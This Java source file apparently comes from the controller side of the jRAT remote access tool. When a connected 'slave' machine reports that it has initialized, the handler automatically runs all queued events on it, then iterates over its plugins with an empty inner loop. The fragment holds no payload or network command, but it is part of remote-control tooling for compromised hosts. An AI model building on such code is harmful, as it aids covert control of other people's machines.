package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.addons.Plugin;
import se.jrat.client.addons.PluginLoader;
import se.jrat.client.events.Event;
import se.jrat.client.events.Events;

public class Packet36Initialized extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		for (Event event : Events.queue.values()) {
			event.perform(slave);
		}
		
		String[] plugins = slave.getPlugins();
		
		if (plugins != null) {
			for (String name : plugins) {
				for (Plugin plugin : PluginLoader.plugins) {
					
				}
			}
		}
	}

}
